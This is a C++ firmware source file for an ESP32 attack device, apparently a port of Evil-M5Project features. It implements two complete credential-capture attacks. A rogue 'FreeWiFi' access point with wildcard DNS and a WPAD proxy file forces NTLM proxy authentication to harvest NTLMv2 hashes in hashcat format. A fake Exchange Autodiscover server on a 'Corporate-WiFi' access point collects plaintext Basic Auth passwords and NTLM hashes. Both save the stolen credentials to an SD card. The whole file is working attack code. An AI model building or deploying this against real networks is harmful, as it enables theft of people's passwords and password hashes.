/*
 * net_wpad — WPAD abuse and Exchange Autodiscover credential capture.
 *
 * Ported from Evil-M5Project (Evil-Cardputer v1.5.2) into POSEIDON
 * style: each feat_xxx() owns its own loop.
 *
 * 1) WPAD Abuse       — SoftAP + DNS wildcard + wpad.dat proxy autoconfig
 *                        + NTLM challenge to capture hashes via proxy auth.
 * 2) Autodiscover     — Fake Exchange Autodiscover endpoint, captures
 *                        Basic Auth (plaintext) or NTLMv2 hashes.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "../sd_helper.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <SD.h>
#include "mbedtls/base64.h"

/* ── WPAD PAC file served to clients ──────────────────────────────── */
static const char WPAD_PAC[] PROGMEM =
    "function FindProxyForURL(url, host) {\n"
    "  return \"PROXY 192.168.4.1:80; DIRECT\";\n"
    "}\n";

/* ── NTLM helpers ─────────────────────────────────────────────────── */
static uint8_t s_ntlm_challenge[8];
static int     s_hash_count = 0;
static String  s_last_user;
static String  s_last_domain;

static String b64_encode(const uint8_t *data, size_t len) {
    size_t out_sz = 4*((len+2)/3)+1;
    uint8_t *out = (uint8_t*)malloc(out_sz);
    if (!out) return "";
    size_t olen = 0;
    mbedtls_base64_encode(out, out_sz, &olen, data, len);
    out[olen] = '\0';
    String s((char*)out); free(out);
    return s;
}

static bool b64_decode(const String &b64, uint8_t *out, size_t *olen, size_t cap) {
    *olen = 0;
    return mbedtls_base64_decode(out, cap, olen,
        (const uint8_t*)b64.c_str(), b64.length()) == 0;
}

static int ntlm_msg_type(const uint8_t *buf, size_t len) {
    if (len < 12 || memcmp(buf, "NTLMSSP\0", 8) != 0) return -1;
    return buf[8] | (buf[9]<<8) | (buf[10]<<16) | (buf[11]<<24);
}

static String hex_str(const uint8_t *d, size_t n) {
    String s; s.reserve(n*2);
    for (size_t i = 0; i < n; i++) { char b[3]; sprintf(b, "%02x", d[i]); s += b; }
    return s;
}

/* Build NTLM Type2 challenge */
static std::vector<uint8_t> build_type2(void) {
    std::vector<uint8_t> h; h.reserve(200);
    auto le16 = [&](uint16_t v){ h.push_back(v&0xFF); h.push_back(v>>8); };
    auto le32 = [&](uint32_t v){ h.push_back(v); h.push_back(v>>8); h.push_back(v>>16); h.push_back(v>>24); };
    auto pushUTF16 = [&](const char *s) { while(*s) { h.push_back((uint8_t)*s); h.push_back(0); s++; } };

    /* signature + type 2 */
    const char sig[] = "NTLMSSP";
    h.insert(h.end(), sig, sig+7); h.push_back(0);
    le32(2);

    /* target name placeholder */
    size_t offTN = h.size();
    le16(0); le16(0); le32(0);

    /* flags */
    le32(0x00000001|0x00000004|0x00000200|0x00080000|0x00800000|0x02000000);

    /* challenge */
    for (int i = 0; i < 8; i++) { s_ntlm_challenge[i] = esp_random() & 0xFF; h.push_back(s_ntlm_challenge[i]); }
    /* reserved */
    for (int i = 0; i < 8; i++) h.push_back(0);

    /* target info placeholder */
    size_t offTI = h.size();
    le16(0); le16(0); le32(0);

    /* version */
    h.push_back(0x0A); h.push_back(0x00); le16(18362);
    h.push_back(0); h.push_back(0); h.push_back(0); h.push_back(0x0F);

    uint32_t varStart = h.size();

    /* target name = "POSEIDON" */
    std::vector<uint8_t> tn;
    { const char *s = "POSEIDON"; while(*s) { tn.push_back((uint8_t)*s); tn.push_back(0); s++; } }
    uint16_t tnLen = tn.size();
    h.insert(h.end(), tn.begin(), tn.end());

    /* target info AV pairs */
    std::vector<uint8_t> ti;
    auto avPair = [&](uint16_t type, const char *ascii) {
        std::vector<uint8_t> v; const char *s=ascii; while(*s){v.push_back((uint8_t)*s);v.push_back(0);s++;}
        ti.push_back(type&0xFF); ti.push_back(type>>8);
        ti.push_back(v.size()&0xFF); ti.push_back(v.size()>>8);
        ti.insert(ti.end(), v.begin(), v.end());
    };
    avPair(0x0002, "POSEIDON");
    avPair(0x0001, "POSEIDON-PROXY");
    avPair(0x0004, "lan");
    avPair(0x0003, "poseidon.lan");
    /* MsvAvEOL */
    ti.push_back(0); ti.push_back(0); ti.push_back(0); ti.push_back(0);

    uint16_t tiLen = ti.size();
    uint32_t tiOff = varStart + tnLen;
    h.insert(h.end(), ti.begin(), ti.end());

    /* patch target name field */
    h[offTN+0] = tnLen&0xFF; h[offTN+1] = tnLen>>8;
    h[offTN+2] = tnLen&0xFF; h[offTN+3] = tnLen>>8;
    h[offTN+4] = varStart; h[offTN+5] = varStart>>8; h[offTN+6] = varStart>>16; h[offTN+7] = varStart>>24;
    /* patch target info field */
    h[offTI+0] = tiLen&0xFF; h[offTI+1] = tiLen>>8;
    h[offTI+2] = tiLen&0xFF; h[offTI+3] = tiLen>>8;
    h[offTI+4] = tiOff; h[offTI+5] = tiOff>>8; h[offTI+6] = tiOff>>16; h[offTI+7] = tiOff>>24;

    return h;
}

/* Save NTLMv2 hash to SD in hashcat mode 5600 format */
static void save_ntlm_hash(const uint8_t *raw, size_t rawLen, const IPAddress &client) {
    if (rawLen < 64) return;
    auto le16v = [&](size_t off){ return (uint16_t)(raw[off]|(raw[off+1]<<8)); };
    auto le32v = [&](size_t off){ return (uint32_t)(raw[off]|(raw[off+1]<<8)|(raw[off+2]<<16)|(raw[off+3]<<24)); };

    uint16_t domLen=le16v(28), domOff=le32v(32);
    uint16_t userLen=le16v(36), userOff=le32v(40);
    uint16_t ntLen=le16v(20), ntOff=le32v(24);

    String domain, user;
    for (int i=0;i<domLen && domOff+i+1<rawLen;i+=2) domain += (char)raw[domOff+i];
    for (int i=0;i<userLen && userOff+i+1<rawLen;i+=2) user += (char)raw[userOff+i];

    if (ntOff+ntLen > rawLen || ntLen < 16) return;
    String chal = hex_str(s_ntlm_challenge, 8);
    String ntHash = hex_str(raw+ntOff, 16);
    String blob = hex_str(raw+ntOff+16, ntLen-16);

    String line = user + "::" + domain + ":" + chal + ":" + ntHash + ":" + blob;

    s_last_user = user;
    s_last_domain = domain;
    s_hash_count++;

    if (sd_mount()) {
        SD.mkdir("/poseidon");
        File f = SD.open("/poseidon/ntlm_hashes.txt", FILE_APPEND);
        if (f) { f.println(line); f.close(); }
    }
    Serial.println("[+] NTLMv2: " + line);
}

/* ── HTTP line/header reader ──────────────────────────────────────── */
static String read_line(WiFiClient &c, uint32_t ms=3000) {
    String s; s.reserve(128);
    uint32_t t0 = millis();
    while (millis()-t0 < ms) {
        while (c.available()) { char ch = c.read(); s += ch; if (ch=='\n') return s; }
        delay(1);
    }
    return s;
}

static String read_headers(WiFiClient &c, uint32_t ms=4000) {
    String h; h.reserve(512);
    uint32_t t0 = millis();
    while (millis()-t0 < ms) {
        while (c.available()) { char ch = c.read(); h += ch; if (h.endsWith("\r\n\r\n")) return h; }
        delay(1);
    }
    return h;
}

static String get_header(const String &headers, const String &name) {
    String lower = headers; lower.toLowerCase();
    String nl = name; nl.toLowerCase();
    int idx = lower.indexOf(nl + ":");
    if (idx < 0) return "";
    int vs = idx + name.length() + 1;
    int le = headers.indexOf("\r\n", vs);
    if (le < 0) le = headers.length();
    String v = headers.substring(vs, le); v.trim();
    return v;
}

/* ── NTLM proxy handler (WPAD mode) ──────────────────────────────── */
static void handle_wpad_client(WiFiClient &client) {
    if (!client.connected()) return;
    String reqLine = read_line(client); reqLine.trim();
    if (reqLine.length() == 0) return;

    String headers = read_headers(client);

    /* Serve wpad.dat */
    if (reqLine.indexOf("/wpad.dat") >= 0) {
        client.print(F("HTTP/1.1 200 OK\r\n"
            "Content-Type: application/x-ns-proxy-autoconfig\r\n"
            "Content-Length: "));
        client.print(strlen_P(WPAD_PAC));
        client.print(F("\r\n\r\n"));
        client.write_P(WPAD_PAC, strlen_P(WPAD_PAC));
        return;
    }

    /* Check for Proxy-Authorization: NTLM */
    String authH = get_header(headers, "Proxy-Authorization");
    if (authH.length() == 0) {
        /* Send initial 407 */
        client.print(F("HTTP/1.1 407 Proxy Authentication Required\r\n"
            "Proxy-Authenticate: NTLM\r\n"
            "Connection: close\r\nContent-Length: 0\r\n\r\n"));
        client.flush(); client.stop();
        return;
    }

    int ntIdx = authH.indexOf("NTLM ");
    if (ntIdx < 0) { client.stop(); return; }
    String b64 = authH.substring(ntIdx + 5); b64.trim();

    uint8_t raw[512]; size_t rawLen = 0;
    if (!b64_decode(b64, raw, &rawLen, sizeof(raw))) { client.stop(); return; }
    int mtype = ntlm_msg_type(raw, rawLen);

    if (mtype == 1) {
        /* Type1 → send Type2 challenge */
        auto t2 = build_type2();
        String t2b64 = b64_encode(t2.data(), t2.size());
        client.print("HTTP/1.1 407 Proxy Authentication Required\r\n"
            "Proxy-Authenticate: NTLM " + t2b64 + "\r\n"
            "Proxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n"
            "Content-Length: 0\r\n\r\n");
        client.flush();

        /* Wait for Type3 on same connection */
        String rl2 = read_line(client, 5000); rl2.trim();
        if (rl2.length() == 0) { client.stop(); return; }
        String h2 = read_headers(client);
        String auth2 = get_header(h2, "Proxy-Authorization");
        if (auth2.length() > 0 && auth2.indexOf("NTLM ") >= 0) {
            String b643 = auth2.substring(auth2.indexOf("NTLM ")+5); b643.trim();
            uint8_t raw3[512]; size_t rawLen3 = 0;
            if (b64_decode(b643, raw3, &rawLen3, sizeof(raw3)) && ntlm_msg_type(raw3, rawLen3) == 3) {
                save_ntlm_hash(raw3, rawLen3, client.remoteIP());
            }
        }
        client.print(F("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 0\r\n\r\n"));
        client.flush(); client.stop();
    } else if (mtype == 3) {
        save_ntlm_hash(raw, rawLen, client.remoteIP());
        client.print(F("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 0\r\n\r\n"));
        client.flush(); client.stop();
    } else {
        client.stop();
    }
}

/* ================================================================== *
 *  1) WPAD ABUSE                                                     *
 * ================================================================== */
void feat_wpad_abuse(void)
{
    radio_switch(RADIO_WIFI);

    WiFi.mode(WiFi.localIP().toString() == "0.0.0.0" ? WIFI_MODE_AP : WIFI_MODE_APSTA);
    WiFi.softAP("FreeWiFi", nullptr, 1, false, 10);
    IPAddress apIP = WiFi.softAPIP();

    DNSServer dns;
    dns.start(53, "*", apIP);

    WiFiServer proxy(80);
    proxy.begin();

    s_hash_count = 0;
    s_last_user = "";
    s_last_domain = "";

    ui_clear_body();
    ui_draw_footer("`=stop");
    ui_text(4, BODY_Y+2,  T_ACCENT, "WPAD ABUSE");
    ui_text(4, BODY_Y+14, T_FG,     "AP: %s", apIP.toString().c_str());
    ui_text(4, BODY_Y+24, T_DIM,    "DNS=* wpad.dat -> proxy -> NTLM");

    uint32_t tUI = 0;
    while (true) {
        dns.processNextRequest();
        WiFiClient c = proxy.available();
        if (c) handle_wpad_client(c);

        uint16_t k = input_poll();
        if (k == PK_ESC) break;

        if (millis() - tUI > 500) {
            tUI = millis();
            uint16_t hcol = s_hash_count ? T_GOOD : T_DIM;
            ui_text(4, BODY_Y+40, hcol, "NTLMv2 hashes: %d", s_hash_count);
            if (s_last_user.length()) {
                ui_text(4, BODY_Y+52, T_FG,  "user: %s", s_last_user.c_str());
                ui_text(4, BODY_Y+62, T_FG,  "dom:  %s", s_last_domain.c_str());
            }
            ui_text(4, BODY_Y+76, T_DIM, "/poseidon/ntlm_hashes.txt");
            ui_draw_status(radio_name(), "wpad");
        }
        delay(10);
    }

    proxy.stop();
    dns.stop();
    WiFi.mode(WIFI_MODE_APSTA);
}

/* ================================================================== *
 *  2) AUTODISCOVER ABUSE                                             *
 * ================================================================== */

static int     s_ad_basic = 0;
static int     s_ad_ntlm  = 0;
static String  s_ad_last_user;
static String  s_ad_last_email;
static String  s_ad_last_type;

static bool ad_decode_basic(const String &authH, String &user, String &pass) {
    int idx = authH.indexOf("Basic ");
    if (idx < 0) return false;
    String b64 = authH.substring(idx + 6); b64.trim();
    uint8_t dec[256]; size_t dlen = 0;
    if (!b64_decode(b64, dec, &dlen, sizeof(dec))) return false;
    String plain((char*)dec); /* user:pass */
    int col = plain.indexOf(':');
    if (col < 0) return false;
    user = plain.substring(0, col);
    pass = plain.substring(col+1);
    return true;
}

static String ad_xml_response(const String &domain) {
    return
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"
        "<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006\">\r\n"
        "  <Response xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\">\r\n"
        "    <Account><AccountType>email</AccountType><Action>settings</Action>\r\n"
        "      <Protocol><Type>EXCH</Type><Server>mail." + domain + "</Server>\r\n"
        "        <AuthPackage>Basic</AuthPackage>\r\n"
        "      </Protocol>\r\n"
        "    </Account>\r\n"
        "  </Response>\r\n"
        "</Autodiscover>\r\n";
}

static void ad_handle_client(WiFiClient &client) {
    if (!client.connected()) return;
    String reqLine = read_line(client); reqLine.trim();
    if (reqLine.length() == 0) return;

    int sp1 = reqLine.indexOf(' ');
    int sp2 = reqLine.indexOf(' ', sp1+1);
    String method = (sp1>0) ? reqLine.substring(0, sp1) : "";
    String uri    = (sp1>0 && sp2>sp1) ? reqLine.substring(sp1+1, sp2) : "";

    /* CONNECT — reject cleanly */
    if (method == "CONNECT") {
        client.print(F("HTTP/1.1 400 Bad Request\r\nConnection: close\r\nContent-Length: 0\r\n\r\n"));
        client.flush(); client.stop(); return;
    }

    String headers = read_headers(client);

    /* Read POST body */
    String body;
    if (method == "POST") {
        int cl = get_header(headers, "Content-Length").toInt();
        if (cl > 0 && cl < 2048) {
            uint32_t t0 = millis();
            while (client.available() < cl && millis()-t0 < 3000) delay(1);
            while (client.available() && (int)body.length() < cl) body += (char)client.read();
        }
    }

    /* Connectivity checks */
    if (uri == "/wpad.dat") {
        const char *pac = "function FindProxyForURL(url,host){return\"DIRECT\";}";
        client.printf("HTTP/1.1 200 OK\r\nContent-Type: application/x-ns-proxy-autoconfig\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
            (int)strlen(pac), pac);
        client.flush(); client.stop(); return;
    }
    if (uri == "/connecttest.txt" || uri == "/ncsi.txt" || uri == "/generate_204" || uri == "/gen_204" ||
        uri == "/hotspot-detect.html" || uri == "/success.txt") {
        client.print(F("HTTP/1.1 200 OK\r\nContent-Length: 7\r\nConnection: close\r\n\r\nsuccess"));
        client.flush(); client.stop(); return;
    }

    /* Only process /autodiscover paths */
    String uriL = uri; uriL.toLowerCase();
    if (uriL.indexOf("/autodiscover") < 0) {
        client.print(F("HTTP/1.1 404 Not Found\r\nConnection: close\r\nContent-Length: 0\r\n\r\n"));
        client.flush(); client.stop(); return;
    }

    String authH = get_header(headers, "Authorization");
    String hostH = get_header(headers, "Host");

    /* Extract email from body if POST */
    String email;
    { int s = body.indexOf("<EMailAddress>"); if (s>=0) { s+=14; int e=body.indexOf("</EMailAddress>",s); if(e>s) email=body.substring(s,e); } }

    /* CASE A: Basic Auth → plaintext capture */
    if (authH.length() > 0 && authH.indexOf("Basic ") >= 0) {
        String user, pass;
        if (ad_decode_basic(authH, user, pass)) {
            String domain = hostH;
            int col = domain.indexOf(':'); if(col>0) domain = domain.substring(0,col);
            if (domain.startsWith("autodiscover.")) domain = domain.substring(13);
            if (email.length()==0) email = user + "@" + domain;

            s_ad_basic++;
            s_ad_last_user  = user;
            s_ad_last_email = email;
            s_ad_last_type  = "BASIC";

            if (sd_mount()) {
                SD.mkdir("/poseidon");
                File f = SD.open("/poseidon/autodiscover_creds.txt", FILE_APPEND);
                if (f) { f.printf("BASIC|%s|%s|%s|%s\n", email.c_str(), user.c_str(), pass.c_str(), domain.c_str()); f.close(); }
            }

            String xml = ad_xml_response(domain);
            client.print("HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: " + String(xml.length()) + "\r\nConnection: close\r\n\r\n" + xml);
            client.flush(); client.stop(); return;
        }
    }

    /* CASE B: NTLM auth */
    if (authH.length() > 0 && authH.indexOf("NTLM ") >= 0) {
        String b64 = authH.substring(authH.indexOf("NTLM ")+5); b64.trim();
        uint8_t raw[512]; size_t rawLen = 0;
        b64_decode(b64, raw, &rawLen, sizeof(raw));
        int mtype = ntlm_msg_type(raw, rawLen);

        if (mtype == 1) {
            auto t2 = build_type2();
            String t2b64 = b64_encode(t2.data(), t2.size());
            client.print("HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM " + t2b64 +
                "\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n");
            client.flush();

            /* Wait for Type3 on same connection */
            String rl2 = read_line(client, 5000); rl2.trim();
            if (rl2.length()) {
                String h2 = read_headers(client);
                String auth2 = get_header(h2, "Authorization");
                if (auth2.indexOf("NTLM ") >= 0) {
                    String b643 = auth2.substring(auth2.indexOf("NTLM ")+5); b643.trim();
                    uint8_t raw3[512]; size_t rawLen3 = 0;
                    if (b64_decode(b643, raw3, &rawLen3, sizeof(raw3)) && ntlm_msg_type(raw3, rawLen3) == 3) {
                        save_ntlm_hash(raw3, rawLen3, client.remoteIP());
                        s_ad_ntlm++;
                        s_ad_last_user = s_last_user;
                        s_ad_last_type = "NTLMv2";
                    }
                }
            }

            String domain = hostH; if (domain.startsWith("autodiscover.")) domain = domain.substring(13);
            if (domain.length()==0) domain = "company.local";
            String xml = ad_xml_response(domain);
            client.print("HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: " + String(xml.length()) + "\r\nConnection: close\r\n\r\n" + xml);
            client.flush(); client.stop(); return;
        } else if (mtype == 3) {
            save_ntlm_hash(raw, rawLen, client.remoteIP());
            s_ad_ntlm++;
            s_ad_last_user = s_last_user;
            s_ad_last_type = "NTLMv2";
            String domain = hostH; if (domain.startsWith("autodiscover.")) domain = domain.substring(13);
            if (domain.length()==0) domain = "company.local";
            String xml = ad_xml_response(domain);
            client.print("HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: " + String(xml.length()) + "\r\nConnection: close\r\n\r\n" + xml);
            client.flush(); client.stop(); return;
        }
    }

    /* CASE C: no creds → send 401 with Basic + NTLM */
    client.print(F("HTTP/1.1 401 Unauthorized\r\n"
        "WWW-Authenticate: Basic realm=\"Exchange Server\"\r\n"
        "WWW-Authenticate: NTLM\r\n"
        "Content-Type: text/plain\r\nContent-Length: 12\r\n"
        "Connection: close\r\n\r\nUnauthorized"));
    client.flush(); client.stop();
}

void feat_autodiscover(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WiFi.localIP().toString() == "0.0.0.0" ? WIFI_MODE_AP : WIFI_MODE_APSTA);

    IPAddress apIP(192,168,4,1);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
    WiFi.softAP("Corporate-WiFi", nullptr, 1, false, 10);

    DNSServer dns;
    dns.start(53, "*", apIP);

    WiFiServer srv(80);
    srv.begin();

    s_ad_basic = 0; s_ad_ntlm = 0;
    s_ad_last_user = ""; s_ad_last_email = "";
    s_hash_count = 0;

    ui_clear_body();
    ui_draw_footer("`=stop");
    ui_text(4, BODY_Y+2,  T_ACCENT, "AUTODISCOVER ABUSE");
    ui_text(4, BODY_Y+14, T_FG,     "AP: %s", apIP.toString().c_str());
    ui_text(4, BODY_Y+24, T_DIM,    "Basic(plaintext) + NTLMv2(hash)");

    uint32_t tUI = 0;
    while (true) {
        dns.processNextRequest();
        WiFiClient c = srv.available();
        if (c) ad_handle_client(c);

        uint16_t k = input_poll();
        if (k == PK_ESC) break;

        if (millis() - tUI > 500) {
            tUI = millis();
            uint16_t col = (s_ad_basic+s_ad_ntlm) ? T_GOOD : T_DIM;
            ui_text(4, BODY_Y+40, col,    "basic(plain): %d", s_ad_basic);
            ui_text(4, BODY_Y+50, col,    "NTLMv2(hash): %d", s_ad_ntlm);
            if (s_ad_last_user.length()) {
                ui_text(4, BODY_Y+64, T_FG,  "last: %s [%s]", s_ad_last_user.c_str(), s_ad_last_type.c_str());
            }
            ui_text(4, BODY_Y+78, T_DIM, "/poseidon/autodiscover_creds.txt");
            ui_draw_status(radio_name(), "autodsc");
        }
        delay(10);
    }

    srv.stop();
    dns.stop();
    WiFi.mode(WIFI_MODE_APSTA);
}
